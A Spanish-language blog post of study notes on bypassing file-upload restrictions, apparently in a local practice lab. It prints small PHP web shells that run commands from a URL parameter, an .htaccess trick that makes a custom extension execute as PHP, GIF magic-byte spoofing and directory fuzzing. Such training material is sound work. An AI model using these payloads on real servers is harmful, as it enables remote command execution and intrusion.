---
layout: single
title: Abuso de subidas de archivos - Hacking Notes
excerpt: "Apuntes de abuso de subidas de archivos (Spanish)"
date: 2025-03-16
classes: wide
header:
  teaser: /img2/obsidian.jpg
  teaser_home_page: true
  icon: /img2/images/Dashboard.jpeg
categories:
  - Hacking Notes
  - Web
tags:
  - File Uploads
---


# Índice
---------
1. [[#Upload 1 Subida básica de archivo php]]
2. [[#Upload 3 Saltar restricción del cliente]]
3. [[#Upload 10 Saltar restricción extensión php]]
4. [[#Upload 11 Saltar restricción extensión php]]
5. [[#Upload 12 Saltar restricción extensión php con .htaccess]]
6. [[#Upload 16 Saltar restricción de tamaño]]
7. [[#Upload 17 Saltar restricción de tamaño aumentada]]
8. [[#Upload 21 Saltar restricción de tipo de archivo]]
9.  [[#Upload 23 Saltar restricción de archivos .gif]]
10. [[#Upload 31 Saltar restricción de archivo en md5]]
11. [[#Upload 33 Saltar restricción de archivo en md5]]
12. [[#Upload 35 Saltar restricción de archivo en SHA-1]]
13. [[#Upload 41 Encontrar el directorio donde se sube el archivo con fuzzing]]
14. [[#Upload 51 Saltar restricción de tipo de archivo .jpg con un un ataque de doble extensión]]
15. [[#Upload 58 Mezcla de las restricciones vistas]]

---------------

## Upload 1 | Subida básica de archivo php
```php
<?php
  system("whoami");
?>
```
![](/img/Pasted%20image%2020241210125757.png)

![](/img/Pasted%20image%2020241210125806.png)


--------
## Upload 3 | Saltar restricción del cliente

![](/img/Pasted%20image%2020241210220620.png)

Vemos que la sanetización se está empleando desde el lado del cliente y no del servidor, para saltarla solo tenemos que borrar esa restricción.

----------
## Upload 10 | Saltar restricción extensión php

Podemos probar a cambiar la extensión del archivo con alternativas:
https://book.hacktricks.xyz/pentesting-web/file-upload

![](/img/Pasted%20image%2020241210221830.png)


-----------------
## Upload 11 | Saltar restricción extensión php

Podemos probar a cambiar la extensión del archivo con alternativas:
https://book.hacktricks.xyz/pentesting-web/file-upload

![](/img/Pasted%20image%2020241211115016.png)


------------
## Upload 12 | Saltar restricción extensión php con .htaccess

1. Comprobamos si nos deja mandar un archivo .htaccess
![](/img/Pasted%20image%2020241211120359.png)

```
AddType application/x-httpd-php .test
```

2. Mandamos el archivo php con la extensión que le hemos indicado en el archivo .htaccess
![](/img/Pasted%20image%2020241211120810.png)


------------
## Upload 16 | Saltar restricción de tamaño

![](/img/Pasted%20image%2020241211121816.png)

```
<?php system($_GET[0]);?>
```

----------------
## Upload 17 | Saltar restricción de tamaño aumentada
![](/img/Pasted%20image%2020241211122142.png)

```
<?=`$_GET[0]`?>
```

------------
## Upload 21 | Saltar restricción de tipo de archivo
![](/img/Pasted%20image%2020241211122623.png)


------------
## Upload 23 | Saltar restricción de archivos .gif

Para cambiar el tipo de archivo necesitamos cambiar los primeros bytes del archivo, ya que estos son los que hacen al sistema identificar que tipo de archivo es.

![](/img/Pasted%20image%2020241211123456.png)


1. Cambiamos el contenido del archivo 
```php
GIF8;
<?php
  system("whoami");
?>
```
![](/img/Pasted%20image%2020241211124322.png)

2. Cambiamos el Content-Type
![](/img/Pasted%20image%2020241211124522.png)

------------
## Upload 31 | Saltar restricción de archivo en md5

1. Vemos que al subir el archivo la imagen nos da una pista de que los archivos de la carpeta uploads están en md5 debido a su longitud de 32 caracteres
![](/img/Pasted%20image%2020241211125654.png)

2. Para encontrar el archivo pasamos el nombre a md5
```bash
echo -n "cmd" | md5sum
```
El nombre del archivo una vez subido sería dfff0a7fa1a55c8c1a4966c19f6da452.php

------------
## Upload 33 | Saltar restricción de archivo en md5

1. Vemos que al subir el archivo la imagen nos da una pista de que los archivos de la carpeta uploads están en md5 debido a su longitud de 32 caracteres
![](/img/Pasted%20image%2020241211125654.png)

2. Para encontrar el archivo pasamos el nombre del archivo completo a md5
```
echo -n "cmd.php" | md5sum
```
El nombre del archivo una vez subido sería b0e4bdfca013a84e5f0b9bc9ae028945.php

---------
## Upload 35 | Saltar restricción de archivo en SHA-1

1. Vemos que al subir el archivo la imagen nos da una pista de que los archivos de la carpeta uploads están en SHA-1 debido a su longitud de 40 caracteres
![](/img/Pasted%20image%2020241211132119.png)

2. Para encontrar el archivo pasamos el contenido a SHA-1
```bash
sha1sum cmd.php
```
El nombre del archivo una vez subido sería cf15b7deb46021f4ed2e3bd7b74c6a8856422841.php

-------------
## Upload 41 | Encontrar el directorio donde se sube el archivo con fuzzing
```bash
gobuster dir -u http://localhost:9001/upload41/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20
```
![](/img/Pasted%20image%2020241211133430.png)


----------------
## Upload 51 | Saltar restricción de tipo de archivo .jpg con un un ataque de doble extensión
![](/img/Pasted%20image%2020241211133931.png)

Esto ocurre porque el desarrollador ha implementado una regex para los archivos que contengan la palabra .jpg, pero no para los archivos que acaben en .jpg

---------
## Upload 58 | Mezcla de las restricciones vistas

1. Subimos el archivo .htaccess
![](/img/Pasted%20image%2020241211135133.png)

2. Cambiamos el archivo a un gif
![](/img/Pasted%20image%2020241211135319.png)